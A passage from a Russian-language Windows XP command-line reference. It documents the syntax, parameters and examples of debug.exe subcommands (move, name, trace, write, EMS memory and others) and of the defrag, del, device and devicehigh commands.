Адрес состоит из двух частей: первая содержит буквенное обозначение сегментного регистра или адрес сегмента из четырех цифр, а вторая содержит значение смещения. Адрес сегмента или сегментный регистр могут быть пропущены. По умолчанию для подкоманд a, g, l, t, u и w команды debug адрес сегмента содержится в регистре CS. Для других подкоманд по умолчанию используется сегмент DS. All numeric values are in hexadecimal format. Между именем сегмента и значением смещения следует вставлять двоеточие. Следующие адреса являются допустимыми:

CS:0100

04BA:0100
- Использование параметра адрес

При вызове подкоманды l с указанием параметра адрес Debug.exe загрузит файл или содержимое сектора диска в область памяти, начиная с адреса.
- Использование всех параметров

При вызове подкоманды l со всеми параметрами Debug.exe загружает содержимое сектора диска, а не файла.
- Загрузка содержимого сектора диска

Каждый сектор в указанном диапазоне считывается с диска, заданного параметром диск. Debug.exe начинает загрузку с первого_сектора и последовательно загружает сектора в память, пока не будет загружено заданное число секторов.
- Загрузка файла .exe

Для файлов с расширением .exe параметр адрес игнорируется. В этом случае Debug.exe использует загрузочный адрес, задаваемый в заголовке .exe файла. При загрузке заголовок отделяется от самого .exe файла, загружаемого в память, поэтому размер файла, указанный в заголовке, и фактически занимаемый размер в памяти будут различаться. Для просмотра .exe файла целиком он может быть переименован в файл с другим расширением и затем просмотрен в программе Debug.
- Загрузка файлов .hex

В программе Debug.exe файлы с расширением .hex распознаются как файлы в шестнадцатеричном формате. Подкоманду l можно запустить без параметров для загрузки такого шестнадцатеричного файла, начиная с адреса, указанного в данном файле. Если подкоманда l запущена с параметром адрес, начальная точка загрузки определяется как сумма заданного адреса и адреса, содержащегося в шестнадцатеричном файле.
- Сведения об указании файла с помощью подкоманды n (name) см. по ссылке «». - Сведения о записи отлаживаемого файла на диск с помощью подкоманды w (write) см. по ссылке «».
Примеры

В командной строке введите:

debug

Введите следующую команду:

nfile.com

Чтобы загрузить файл File.com, введите следующую команду:

l

Debug.exe загружает этот файл и выводит приглашение debug.

Чтобы загрузить содержимое 109 (6Dh) секторов диска C, начиная с логического сектора 15 (0Fh), в область памяти, начиная с адреса 04BA:0100, введите следующую команду:

l04ba:100 2 0f 6d
========================================================================================
Debug: m (move)

Копирование содержимого одного блока памяти в другой.
Синтаксис

m диапазон адрес
Параметры

диапазон
    Обязательный параметр. Задание начального и конечного адреса или начального адреса и длины области памяти, содержимое которой требуется скопировать.
адрес
    Обязательный параметр. Задание начального адреса области памяти, в которую требуется скопировать содержимое диапазона.
?
    Вывод списка подкоманд debug.

Примечания
- Задание правильных записей диапазона

Параметр диапазон используется в подкомандах debug для задания диапазона памяти. Параметр диапазон можно задать в одном из следующих форматов: начальный адрес и конечный адрес или начальный адрес и длина (обозначаемая l) диапазона. Например, оба следующих выражения задают диапазон из 16 байтов, начинающийся с адреса CS:100:

cs:100 10f

cs:100 l 10
- Задание правильных записей адреса

Адрес состоит из двух частей: первая содержит буквенное обозначение сегментного регистра или адрес сегмента из четырех цифр, а вторая содержит значение смещения. Адрес сегмента или сегментный регистр могут быть пропущены. По умолчанию для подкоманд a, g, l, t, u и w команды debug адрес сегмента содержится в регистре CS. Для других подкоманд по умолчанию используется сегмент DS. Все числовые значения при этом представлены в шестнадцатеричном формате. Между именем сегмента и значением смещения следует вставлять двоеточие. Следующие адреса являются допустимыми:

CS:0100

04BA:0100
- Копирование данных

Если адреса в копируемом блоке памяти заданы так, что в этот блок не записываются новые данные, то информация в этом блоке не изменяется. Если же операция копирования является перекрывающей, перекрывающиеся данные перезаписываются. (Операция копирования является перекрывающей, если два блока памяти имеют общую часть).
- Перекрывающееся копирование двух областей памяти

Подкоманда m выполняет перекрывающее копирование без потери данных в области назначения. Содержимое адресов, которые будут перезаписаны, копируется в первую очередь. Если данные копируются из старших адресов в младшие адреса, операция копирования начинается с младшего адреса исходного блока и продолжается в направлении старшего адреса. И наоборот, если данные копируются из младших адресов в старшие, копирование начинается со старших адресов исходного блока и продолжается в направлении младшего адреса.
Примеры

Чтобы скопировать содержимое адресов с CS:110 по CS:510, а затем с CS:10F по CS:50F и так далее, пока все содержимое адресов с CS:100 по CS:500 не будет скопировано, введите следующую команду:

mcs:100 110 cs:500

Чтобы просмотреть результаты, воспользуйтесь подкомандой d (dump), указав адреса, заданные в подкоманде m.
========================================================================================
Debug: n (name)

Задание имени исполняемого файла для команд debug l (load) или w (write) или задание параметров для отлаживаемого исполняемого файла. Выполненная без параметров подкоманда n очищает текущие значения.
Синтаксис

n [путь][исполняемый_файл]

n [параметры_файла]
Параметры

[путь][исполняемый_файл
    Задание расположения и имени исполняемого файла для тестирования.
[параметры_файла]
    Задание параметров и ключей командной строки для тестируемого исполняемого файла.
?
    Вывод списка подкоманд debug.

Примечания
- Использование подкоманды n

Подкоманду n можно использовать двумя способами. Во-первых, для задания имени файла для последующих подкоманд l (load) или w (write). Если программа Debug.exe вызвана без задания имени файла для отладки, команда n имя_файла должна быть вызвана перед использованием команды l для загрузки файла. Имя файла форматируется соответствующим образом для контрольного блока файла (FCB) по адресу CS:5C. Во-вторых, подкоманда n может использоваться для задания параметров и ключей командной строки отлаживаемого файла.
- Области памяти

В следующей таблице перечислены четыре области памяти, которые используются командой n.
Область памяти     Contents
CS:5C     Блок управления файлом (FCB) для файла 1
CS:6C     Блок управления файлом (FCB) для файла 2
CS:80     Длина строки команды n (в символах)
CS:81     Начало строки команды n

Первое имя файла, задаваемое командой n, размещается в блоке управления файлом по адресу CS:5C. Если задано второе имя, оно помещается в блок управления файлом по адресу CS:6C. Количество символов в командной строке команды n (кроме первого символа, n) сохраняется по адресу CS:80. Собственно командная строка n (снова без символа n) сохраняется, начиная с адреса CS:81. Эти символы могут быть любыми параметрами и разделителями, которые допустимо вводить с командной строки в Windows 2000.
- Сведения о загрузке содержимого файла или определенных секторов диска в память с помощью команды Debug L (Load) см. по ссылке «». - Сведения о записи отлаживаемого файла на диск с помощью подкоманды w (write) см. по ссылке «».
Примеры

В этом примере запускается команда debug и загружается программа Prog.com для отладки. Чтобы указать два параметра для программы Prog.com и запустить эту программу, введите следующую команду:

debug prog.com
nparam1 param2
g

В этом случае подкоманда g (go) запускает программу так, как если бы она была запущена с командной строки в виде:

prog param1 param2

При тестировании и отладке создается среда времени исполнения для программы Prog.com.

В следующей последовательности команд первая подкоманда n задает имя файла File1.exe для последующей подкоманды l (load), которая загружает файл File1.exe в память. Вторая подкоманда n задает параметры для файла File1.exe. Наконец, подкоманда g запускает File1.exe так, как если бы с командной строки было бы введено File1 File2.dat File2.dat.

nfile1.exe
l
nfile2.dat file3.dat
g

После команды l во втором экземпляре команда n не используется. Если подкоманда w (write) используется во втором экземпляре подкоманды n, файл File1.exe (т. е. отлаживаемый) сохраняется под именем File2.dat. Чтобы этого не произошло, всегда вызывайте команду l или w сразу же после команды n в первой форме.
========================================================================================
Debug: o (output)

Вывод байта в порт вывода.
Синтаксис

o порт байт
Параметры

порт
    Обязательный параметр. Задание адреса порта вывода. Адрес порта может быть 16-битным значением.
байт
    Обязательный параметр. Задание значения байта, выводимого в порт.
?
    Вывод списка подкоманд debug.

Примечания
- Сведения о чтении байта из порта ввода с помощью подкоманды i (input) см. по ссылке «».
Примеры

Чтобы отправить байт 4Fh в порт вывода по адресу 2F8h, введите следующую команду:

o2f8 4f
========================================================================================
Debug: p (proceed)

Выполнение цикла, строковой инструкции, программного прерывания или процедур, а также вход в другую инструкцию. Выполненная без параметров команда p выводит список реестров и их текущих значений.
Синтаксис

p [=адрес] [число]
Параметры

адрес
    Задание адреса инструкции, которая будет выполнена первой. Если адрес не указан, по умолчанию выполнение начнется с инструкции, задаваемой регистрами CS:IP.
число
    Задание количества инструкций, которые будут выполнены перед возвратом управления программе Debug.exe. По умолчанию используется значение 1.
?
    Вывод списка подкоманд debug.

Примечания
- Задание правильных записей адреса

Адрес состоит из двух частей: первая содержит буквенное обозначение сегментного регистра или адрес сегмента из четырех цифр, а вторая содержит значение смещения. Адрес сегмента или сегментный регистр могут быть пропущены. По умолчанию для подкоманд a, g, l, t, u и w команды debug адрес сегмента содержится в регистре CS. Для других подкоманд по умолчанию используется сегмент DS. Все числовые значения при этом представлены в шестнадцатеричном формате. Между именем сегмента и значением смещения следует вставлять двоеточие. Следующие адреса являются допустимыми:

CS:0100

04BA:0100
- Использование параметра адрес

Если в параметре адрес не указан сегмент, Debug.exe использует регистр CS тестируемой программы. Если параметр адрес опущен, выполнение программы начинается с адреса, указываемого регистрами CS:IP. Чтобы отличить параметр адрес от параметра число, перед адресом обязательно должен быть введен знак равенства (=). В случае если инструкция по заданному адресу не является циклом, строковой инструкцией, программным прерыванием или процедурой, подкоманда p работает также, как подкоманда t (trace).
- Передача управления тестируемой программе

Если в программе Debug.exe управление передано тестируемой программе с помощью команды p, выполнение продолжается до тех пор, пока цикл, строковая инструкция, программное прерывание или процедура не будут закончены или пока не будет выполнено заданное количество инструкций. Затем управление возвращается к Debug.exe.
- Просмотр сообщений

После запуска подкоманды p Debug.exe выводит на экран содержимое регистров, флаги состояния и следующую инструкцию в деассемблированном виде.

Предупреждение!
- Подкоманда p не может быть использована для отладки инструкций, содержащихся в ПЗУ. - Сведения о запуске текущей программы с помощью подкоманды g см. по ссылке «». - Сведения о выполнении одной инструкции с помощью подкоманды t (trace) см. по ссылке «».
Примеры

В этом примере тестируемая программа содержит инструкцию call по адресу CS:143F. Чтобы выполнить процедуру, указанную в call, и возвратиться в программу Debug.exe, введите следующую команду:

p=143f

Результаты программы Debug.exe будут выведены в следующем формате:

AX=0000 BX=0000 CX=0000 DX=0000 SP=FFEE BP=0000 SI=0000 DI=0000
DS=2246 ES=2246 SS=2246 CS=2246 IP=1443 NV UP EI PL NZ AC PO NC
2246:1442 7505 JNZ 144A
========================================================================================
Debug: q (quit)

Окончание работы программы Debug.exe без сохранения тестируемого файла и возврат в командную строку.
Синтаксис

q
Параметры

?
    Вывод списка подкоманд debug.

Примечания
========================================================================================
Debug: r (register)

Редактирование содержимого одного или нескольких регистров ЦПУ. Выполненная без параметров команда r выводит содержимое всех регистров и флагов из временного хранилище регистра, состояния всех всех флагов и декодированную инструкцию в текущей области.
Синтаксис

r [регистр]
Параметры

регистр
    Задание имени регистра, содержащего сведения, которые требуется вывести на экран.
?
    Вывод списка подкоманд debug.

Примечания
- Использование подкоманды r

Если задан регистр, Debug.exe выводит на экран его 16-разрядное значение в шестнадцатеричном формате и двоеточие в качестве приглашения. Если требуется изменить значение содержащееся в регистре, введите новое значение и нажмите клавишу ENTER. В противном случае нажмите клавишу ENTER для возврата к приглашению программы debug.
- Допустимые регистры x86

В следующей таблице перечислены допустимые регистры x86 для параметра регистр.
Значение
ax
bp
bx
cs
cx
di
ds
dx
es
f
ip
pc
si
sp
ss

Если задан недопустимый регистр, выводится следующее сообщение:

Ошибка: br
- Использование f вместо регистра

Если указать f вместо регистра, Debug.exe выводит на экран текущее значение каждого флага состояния в виде двухбуквенного кода и приглашение debug. Для изменения значения флага введите соответствующий двухбуквенный код, воспользовавшись следующей таблицей.
Флаг     Установлен     Снят
Переполнение     ov     nv
Направление     dn (уменьшение)     up (увеличение)
Прерывание     ei (включено)     di (выключено)
Знак     ng (отрицательный)     pl (положительный)
Ноль     zr     nz
Добавочный перенос     ac     na
Четность     pe (четный)     po (нечетный)
Перенос     cy     nc

Новые значения флагов могут быть введены в любой последовательности. Между этими значениями не нужно вводить пробел. Чтобы завершить выполнение подкоманды r, нажмите клавишу ENTER. Флаги, новые значения для которых не вводились, останутся неизмененными.
- Сообщения подкоманды r

При задании более одного значения для флага выводится следующее сообщение:

Ошибка: df

При вводе кода, не содержащегося в таблице, выводится следующее сообщение:

Ошибка: bf

В обоих случаях Debug.exe пропустит все значения, следующие после неверного ввода.
- Значения, используемые по умолчанию в программе Debug.exe

Когда запускается программа Debug.exe, сегментный регистр указывает на нижнюю границу свободной памяти, указатель инструкций устанавливается равным 0100h, все флаги состояния очищаются, оставшиеся регистры обнуляются, за исключением sp, который устанавливается равным FFEEh.
- Сведения о просмотре содержимого области памяти с помощью подкоманды d см. по ссылке «». - Сведения о деассемблировании байт с помощью подкоманды u см. по ссылке «».
Примеры

Если текущее положение указателя инструкций равно CS:11A, выводятся следующие сведения:

AX=0E00 BX=00FF CX=0007 DX=01FF SP=039D BP=0000 SI=005C DI=0000
DS=04BA ES=04BA SS=04BA CS=O4BA IP=011A NV UP DI NG NZ AC PE NC
04BA:011A CD21 INT 21

Чтобы просмотреть только состояния флагов, введите следующую команду:

rf

Результаты программы Debug.exe выводятся в следующем формате:

NV UP DI NG NZ AC PE NC - _

Введите одно и несколько допустимых значений флагов с пробелами или без них. Например:

nv up di ng nz ac pe nc - pleicy

Debug.exe завершит выполнение подкоманды r и выведет приглашение debug. Для просмотра изменений воспользуйтесь командой r или rf. Программа Debug.exe выводит следующие сведения:

NV UP EI PL NZ AC PE CY - _

Нажмите клавишу ENTER для возврата к приглашению программы debug.
========================================================================================
Debug: s (search)

Поиск в области памяти по шаблону из одного или нескольких байт.
Синтаксис

s диапазон список
Параметры

диапазон
    Обязательный параметр. Задает начальный и конечный адреса области памяти, в которой будет производиться поиск.
список
    Обязательный параметр. Задание шаблона из одного или нескольких байт или символьной строки для поиска.
?
    Вывод списка подкоманд debug.

Примечания
- Задание правильных записей диапазона

Параметр диапазон используется в подкомандах debug для задания диапазона памяти. Параметр диапазон можно задать в одном из следующих форматов: начальный адрес и конечный адрес или начальный адрес и длина (обозначаемая l) диапазона. Например, оба следующих выражения задают диапазон из 16 байтов, начинающийся с адреса CS:100:

cs:100 10f

cs:100 l 10
- Использование параметра список

Если используется параметр список, отделяйте значение каждого байта пробелом или запятой, а строки заключайте в кавычки (т. е. "строка"). Если список содержит несколько значений, выводится только первый адрес, в котором встречается данное значение. Если список содержит только одно значение, выводятся все адреса из указанного диапазона, в которых встречается данное значение.
Примеры

Чтобы найти все адреса в диапазоне от CS:100 до CS:110, содержащие значение 41, введите следующую команду:

scs:100 110 41

Результаты программы Debug.exe будут выведены в следующем формате:

04BA:0104
04BA:010D
-

Чтобы найти строку «Ph» в диапазоне от CS:100 до CS:1A0, введите следующую команду:

scs:100 1a0 "Ph"
========================================================================================
Debug: t (trace)

Выполнение одной инструкции с выводом содержимого регистров, флагов состояния и декодированной формы выполняемой инструкции. При запуске подкоманды t без параметров выполнение начинается с адреса, указанного в регистрах CS:IP программы.
Синтаксис

t [=адрес] [число]
Параметры

адрес
    Задание адреса, с которого Debug.exe начнет выполнение инструкций. 
число
    Указывает число инструкций для выполнения. Указанное значение должно быть шестнадцатеричным числом. По умолчанию значение равно 1.
?
    Вывод списка подкоманд debug.

Примечания
- Задание правильных записей адреса

Адрес состоит из двух частей: первая содержит буквенное обозначение сегментного регистра или адрес сегмента из четырех цифр, а вторая содержит значение смещения. Адрес сегмента или сегментный регистр могут быть пропущены. По умолчанию для подкоманд a, g, l, t, u и w команды debug адрес сегмента содержится в регистре CS. Для других подкоманд по умолчанию используется сегмент DS. Все числовые значения при этом представлены в шестнадцатеричном формате. Между именем сегмента и значением смещения следует вставлять двоеточие. Следующие адреса являются допустимыми:

CS:0100

04BA:0100
- Трассировка инструкций, записанных в ПЗУ

Подкоманда t использует аппаратный режим трассировки микропроцессоров 8086 и 8088. Следовательно, также можно трассировать инструкции, хранимые в ПЗУ.
- Сведения о выполнении циклов, строковых инструкций, программных прерываний и процедур с помощью подкоманды p (proceed) см. по ссылке «». - Сведения о выполнении текущей программы с помощью подкоманды g (go) см. по ссылке «».
Примеры

Если текущая позиция указателя кода является 04BA:011A, Debug.exe выведет следующие сведения:

AX=0E00 BX=00FF CX=0007 DX=01FF SP=039D BP=0000 SI=005C DI=0000
DS=04BA ES=04BA SS=04BA CS=O4BA IP=011A NV UP DI NG NZ AC PE NC
04BA:011A CD21 INT 21
========================================================================================
Debug: u (unassemble)

Деассемблирование байтов и просмотр соответствующего исходного кода, включая адреса и двоичные значения. Деассемблированный код выводится в формате, похожем на распечатку ассемблерного файла. Выполненная без параметров подкоманда u деассемблирует 20h байт (значение по умолчанию), начиная с первого адреса после адреса, использованного в предыдущей подкоманде u.
Синтаксис

u [диапазон]
Параметры

диапазон
    Задание начального и конечного адреса или начального адреса и длины участка двоичного кода, который требуется деассемблировать.
?
    Вывод списка подкоманд debug.

Примечания
- Задание правильных записей диапазона

Параметр диапазон используется в подкомандах debug для задания диапазона памяти. Параметр диапазон можно задать в одном из следующих форматов: начальный адрес и конечный адрес или начальный адрес и длина (обозначаемая l) диапазона. Например, оба следующих выражения задают диапазон из 16 байтов, начинающийся с адреса CS:100:

cs:100 10f

cs:100 l 10
- Сведения о создании двоичного кода с помощью подкоманды a (assemble) см. по ссылке «». - Сведения о просмотре содержимого области памяти с помощью подкоманды d (dump) см. по ссылке «».
Примеры

Чтобы деассемблировать 16 (10h) байт, начиная с адреса 04BA:0100, введите следующую команду:

u04ba:100l10

Результаты программы Debug.exe выводятся в следующем формате:

04BA:0100 206472 AND [SI+72],AH
04BA:0103 69 DB 69
04BA:0104 7665 JBE 016B
04BA:0106 207370 AND [BP+DI+70],DH
04BA:0109 65 DB 65
04BA:010A 63 DB 63
04BA:010B 69 DB 69
04BA:010C 66 DB 66
04BA:010D 69 DB 69
04BA:010E 63 DB 63
04BA:010F 61 DB 61

Чтобы просмотреть сведения только об адресах с 04BA:0100 по 04BA:0108, введите следующую команду:

u04ba:0100 0108

Программа Debug.exe выводит следующие сведения:

04BA:0100 206472 AND [SI+72],AH
04BA:0103 69 DB 69
04BA:0104 7665 JBE 016B
04BA:0106 207370 AND [BP+DI+70],DH
========================================================================================
Debug: w (write)

Запись файла или определенных секторов на диск. При запуске подкоманды w без параметров запись начинается с адреса CS:100.
Синтаксис

w [адрес]

w [адрес] [диск] [первый_сектор] [число]
Параметры

адрес
    Задание начального адреса файла или части файла, которые требуется записать на диск. 
диск
    Задание дисковода, содержащего диск назначения. Данный параметр задается числом: 0 = A, 1 = B, 2 = C и т. д.
первый_сектор
    Задание шестнадцатеричного адреса первого сектора для записи.
число
    Задание количества секторов, которые требуется записать.
?
    Вывод списка подкоманд debug.

Примечания
- Для записи количества байт, заданного в регистрах BX:CX, в файл на диске используется следующий синтаксис команды:

w [адрес]
- Для пропуска файловой системы и прямой записи указанных секторов используется следующий синтаксис команды:

w [адрес] [диск] [первый_сектор] [число]
- Задание правильных записей адреса

Адрес состоит из двух частей: первая содержит буквенное обозначение сегментного регистра или адрес сегмента из четырех цифр, а вторая содержит значение смещения. Адрес сегмента или сегментный регистр могут быть пропущены. По умолчанию для подкоманд a, g, l, t, u и w команды debug адрес сегмента содержится в регистре CS. Для других подкоманд по умолчанию используется сегмент DS. Все числовые значения при этом представлены в шестнадцатеричном формате. Между именем сегмента и значением смещения следует вставлять двоеточие. Следующие адреса являются допустимыми:

CS:0100

04BA:0100
- Имя файла на диске нужно задать при запуске программы Debug.exe или в последней вызванной подкоманде n (name). Оба эти метода правильно форматируют имя файла для блока управления файлом (FCB) по адресу CS:5C. - Сброс значений регистров BX:CX перед использованием команды w без параметров.

Если используются подкоманды g (go), t (trace), p (proceed) или r (register), перед использованием команды w без параметров значения регистров BX:CX необходимо сбросить.
- Запись измененного файла на диск

Если файл был изменен, но имя, размер и начальный адрес не менялись, Debug.exe позволяет записать файл в его исходное расположение на диске.
- Запись файлов .exe или .hex

Файлы с расширениями .exe и .hex нельзя записать с помощью этой команды.

Предупреждение!
- Непосредственная запись в сектор диска является исключительно опасной, так как в этом случае не выполняется дескриптор файла Windows XP. Логическая структура диска может быть повреждена при вводе неверного значения. - Сведения об указании файла с помощью подкоманды n (name) см. по ссылке «». - Сведения о загрузке содержимого файла или определенных секторов файла в память с помощью команды l (load) см. по ссылке «».
Примеры

Чтобы записать содержимое области памяти, начиная с адреса CS:100, на диск B и собрать данные из 2Bh секторов, начиная с логического сектора диска под номером 37h, введите следующую команду:

wcs:100 1 37 2b

После окончания операции записи выводится приглашение программы debug.
========================================================================================
Debug: xa (allocate expanded memory)

Выделение заданного количества страниц памяти EMS. Выполненная без параметров подкоманда xa проверяет наличие или отсутствие поддержки дополнительной памяти (EMS).
Синтаксис

xa [число_страниц]
Параметры

число_страниц
    Задание числа выделяемых страниц памяти EMS. Размер страницы составляет 16 килобайт.
?
    Вывод списка подкоманд debug.

Примечания
- Система Windows XP не поддерживает память EMS. Для использования памяти EMS на компьютере должен быть установлен драйвер памяти EMS, поддерживающий версию 4.0 спецификации Lotus/Intel/Microsoft Expanded Memory Specification (LIM EMS). -Если запрашиваемое количество страниц доступно, Debug.exe выводит сообщение о шестнадцатеричном номере созданного дескриптора. В противном случае выводится сообщение об ошибке.
Примеры

Чтобы выделить восемь страниц дополнительной памяти, введите следующую команду:

xa8

Если команда успешно выделит память, выводятся следующие сведения:

Создан дескриптор=0003
========================================================================================
Debug: xd (deallocate expanded memory)

Освобождение дескриптора памяти EMS. Выполненная без параметров подкоманда xd проверяет наличие или отсутствие поддержки дополнительной памяти (EMS).
Синтаксис

xd [дескриптор]
Параметры

дескриптор
    Задание освобождаемого дескриптора.
?
    Вывод списка подкоманд debug.

Примечания
- Система Windows XP не поддерживает память EMS. Для использования памяти EMS на компьютере должен быть установлен драйвер памяти EMS, поддерживающий версию 4.0 спецификации Lotus/Intel/Microsoft Expanded Memory Specification (LIM EMS).
Примеры

Чтобы освободить дескриптор 0003, введите следующую команду:

xd 0003

При успешном выполнении программы Debug.exe будет выведено сообщение:

Дескриптор 0003 освобожден
========================================================================================
Debug: xm (мар expanded memory pages)

Отображение логической страницы памяти EMS, соответствующей заданному дескриптору, в физическую страницу памяти EMS. Выполненная без параметров подкоманда xm проверяет наличие или отсутствие поддержки памяти EMS.
Синтаксис

xm [лог_страница] [физ_страница] [дескриптор]
Параметры

лог_страница
    Задание номера логической страницы памяти EMS, которая будет отображена в физическую страницу физ_страница.
физ_страница
    Задание номера физической страницы памяти EMS, в которую будет отображена логическая страница лог_страница.
дескриптор
    Задание дескриптора.
?
    Вывод списка подкоманд debug.

Примечания
- Система Windows XP не поддерживает память EMS. Для использования памяти EMS на компьютере должен быть установлен драйвер памяти EMS, поддерживающий версию 4.0 спецификации Lotus/Intel/Microsoft Expanded Memory Specification (LIM EMS).
Примеры

Чтобы отобразить логическую страницу 5 дескриптора 0003 в физическую страницу 2, введите следующую команду:

xm 5 2 0003

При успешном выполнении программы Debug.exe будет выведено сообщение:

Логическая страница 05 отображена на физическую страницу 02
========================================================================================
Debug: xs (display expanded memory status)

Вывод сведений о состоянии памяти EMS.
Синтаксис

xs
Параметры

?
    Вывод списка подкоманд debug.

Примечания
- Для использования памяти EMS на компьютере должен быть установлен драйвер памяти EMS, поддерживающий версию 4.0 спецификации Lotus/Intel/Microsoft Expanded Memory Specification (LIM EMS). - Результаты программы Debug.exe выводятся в следующем формате:

Для дескриптора xx выделено xx страниц
Физическая страница xx = Сегмент EMS xx
Выделено xx из xx страниц EMS
Выделено xx из xx дескрипторов EMS
Примеры

Чтобы вывести сведения о состоянии памяти EMS, введите следующую команду:

xs

Подкоманда xs выводит сведения в следующем виде:

 Handle 0000 has 0000 pages allocated 
 Для дескриптора 0001 выделено 0002 страниц
 Физическая страница 00 = Сегмент EMS C000
 Физическая страница 01 = Сегмент EMS C400
 Физическая страница 02 = Сегмент EMS C800
 Физическая страница 03 = Сегмент EMS CC00
 Выделено 2 из 80 страниц EMS
 Выделено 2 из FF дескрипторов EMS 

========================================================================================
Defrag

Поиск и объединение фрагментированных файлов загрузки, файлов данных и папок на локальных томах.
Синтаксис

defrag том

defrag том [/a]

defrag том [/a] [/v]

defrag том [/v]

defrag том [/f]
Параметры

том
    Буква диска или точка подключения тома, который требуется дефрагментировать.
/a
    Анализ тома и вывод краткого отчета об анализе.
/v
    Отображение полных отчетов об анализе и дефрагментации.

    Если этот параметр используется вместе с параметром /a, выводится только отчет об анализе. Если данный параметр используется отдельно, выводятся отчеты как об анализе, так и о дефрагментации.
/f
    Дефрагментация тома независимо от необходимости выполнения данной операции. 
/?
    Отображение справки в командной строке.

Примечания
- Для полной и правильной дефрагментации с помощью команды defrag том должен иметь не менее 15% свободного пространства. Defrag использует этот объем как область для сортировки фрагментов файлов. Если объем составляет менее 15% свободного пространства, то команда defrag выполнит только частичную дефрагментацию. Чтобы освободить дополнительное место на диске, удалите ненужные файлы или переместите их на другой диск.- Тома, которые, возможно, повреждены, помечаются файловой системой как «грязные»; дефрагментация таких томов невозможна. Чтобы дефрагментировать «грязный» том, для него необходимо выполнить команду chkdsk. Определить, является ли том «грязным», можно с помощью команды fsutil dirty query. Дополнительные сведения о командах chkdsk и fsutil dirty см. по ссылке «».- В ходе анализа и дефрагментации тома в программе defrag отображается мигающий курсор. По завершении анализа и дефрагментации тома программа defrag выводит отчет об анализе, отчет о дефрагментации или оба этих отчета, после чего окно командной строки закрывается.- По умолчанию программа defrag выводит сводку обоих отчетов (об анализе и о дефрагментации), если не был введен параметр /a или /v.- Чтобы экспортировать отчеты в текстовый файл, введите параметр >имя_файла.txt, где имя_файла.txt — имя файла, задаваемое пользователем. Например:

defrag том /v >имя_файла.txt
- Чтобы прервать процесс дефрагментации, нажмите клавиши CTRL+C в окне командной строки.- Ввод команды defrag и запуск программы «Дефрагментация диска» являются взаимно исключающими действиями. Если программа «Дефрагментация диска» используется для дефрагментации тома, а пользователь запускает команду defrag из командной строки, то команда defrag не выполняется. И наоборот, если команда defrag выполняется из командной строки, а пользователь открывает программу «Дефрагментация диска», то параметры дефрагментации в окне этой программы являются недоступными. ========================================================================================
Del (erase)

Удаление заданных файлов.
Синтаксис

del [диск:][путь] имя_файла [ ...] [/p] [/f] [/s] [/q] [/a[:атрибуты]]

erase [диск:][путь] имя_файла [ ...] [/p] [/f] [/s] [/q] [/a[:атрибуты]]
Параметры

[диск:][путь] имя_файла
    Задание расположения и имени файла для удаления. Параметр имя_файла является обязательным. Допускается использование нескольких имен файлов. Имена файлов следует разделять пробелом, запятой или точкой с запятой.
/p
    Задание удаления с подтверждением для каждого файла.
/f
    Задание удаления файлов с атрибутом «Только чтение».
/s
    Удаление заданных файлов в каталоге и всех его подкаталогах. Выводит имена удаляемых файлов.
/q
    Задание автоматического режима. Не выводится подтверждение на удаление. 
/a
    Удаление файлов с заданными атрибутами.
атрибуты
    Задание следующих атрибутов файла.
Атрибут     Описание
r     Только чтение
a     Архивный
s     Системный
h     Скрытый
-     Префикс «нет»
/?
    Отображение справки в командной строке.

Примечания
- Использование /p

Если задан параметр /p, команда del выводит на экран имя каждого удаляемого файла и следующее сообщение:

имя_файла, Удалить [Y(да)/N(нет)]?

Для подтверждения удаления следует нажать клавишу Y, для отмены удаления и перехода к следующему файлу следует нажать N (если задана группа файлов) или CRTL+C для остановки работы команды del.
- Отключение расширений командного процессора

Если расширения командного процессора отключены, параметр командной строки /s выводит все ненайденные, а не удаленные файлы (т. е. имеет противоположный смысл). Дополнительные сведения об отключении расширений командного процессора см. в разделе cmd, доступном по ссылке «».
- Удаление нескольких файлов

Все файлы в каталоге могут быть удалены с помощью команды del с параметрами [диск:]путь. Например, следующая команда позволяет удалить все файлы в папке \Work:

del \work

Кроме того, для удаления нескольких файлов можно воспользоваться подстановочными знаками (* и ?). При использовании символов подстановки в команде del следует быть особенно внимательным во избежание нежелательных удалений. Например, можно ввести следующую команду:

del *.*

Команда del выводит следующий запрос:

Все файлы в каталоге будут удалены. Продолжать [Y(да)/N(нет)]?

Для удаления всех файлов в текущей папке следует нажать Y и ENTER, для отмены удаления — N и ENTER.

Перед использованием команды del для удаления группы файлов, заданной с помощью символов подстановки, полезно вначале вызвать команду dir с теми же самыми символами для вывода списка файлов, которые будут удалены.

Предупреждение!
- После удаления файлов с диска с помощью команды del, их, возможно, уже не удастся восстановить. - Команда del с другими параметрами доступна в консоли восстановления.
Примеры

Чтобы удалить все файлы из папки Test на диске C, введите одну из следующих команд:

del c:\test

del c:\test\*.*
========================================================================================
Device

Загрузка в память указанного драйвера устройства.
Синтаксис

device=[диск:][путь] имя_файла [параметры]
Параметры

[диск:][путь] имя_файла
    Задание месторасположения и имени файла драйвера устройства, который требуется загрузить. Параметр имя_файла является обязательным.
[параметры]
    Задание параметров командной строки для драйвера устройства.
/?
    Отображение справки в командной строке.

Примечания
- Для загрузки драйверов, необходимых подсистеме MS-DOS, следует использовать файл системный_корневой_каталог\System32\Config.nt или эквивалентный загрузочный файл, заданный в файле описания программы (.PIF).
Примеры

Для использования управляющих последовательностей ANSI, работающих с дисплеем и клавиатурой подсистемы MS-DOS, в файл Config.nt или эквивалентный файл запуска требуется добавить следующую строку:

device=c:\winnt\system32\ansi.sys
========================================================================================
Devicehigh

Загрузка драйвера устройства в верхнюю область памяти. Таким образом освобождается больший объем обычной памяти для использования другими программами. Для загрузки драйверов, необходимых подсистеме MS-DOS, следует использовать файл системный_корневой_каталог\System32\Config.nt или эквивалентный загрузочный файл, заданный в файле описания программы (.PIF).
Синтаксис

device=[диск:][путь] имя_файла [параметры]

devicehigh size=размер [диск:][путь] имя_файла [параметры]
Параметры

[диск:][путь] имя_файла
    Задание местонахождения и имени файла драйвера устройства, который будет загружен в верхнюю область памяти. Параметр имя_файла является обязательным. 
параметры
    Задание параметров командной строки для драйвера устройства.
размер
    Обязательный параметр. Задание минимального объема памяти (количество байт в шестнадцатеричном формате), который должен быть доступен, перед тем как команда devicehigh попытается загрузить драйвер в верхнюю память. Параметры size и размер должны присутствовать в строке команды, как показано выше. 
/?
    Отображение справки в командной строке.

Примечания
- Использование команды dos=umb

Для использования команды devicehigh необходимо включить команду dos=umb в файл Config.nt или эквивалентный загрузочный файл. Если это условие не выполнено, все драйверы устройств будут загружаться в обычную память, как при использовании команды device. Дополнительные сведения о команде dos=umb см. по ссылке «».
- Установка драйвера Himem.sys

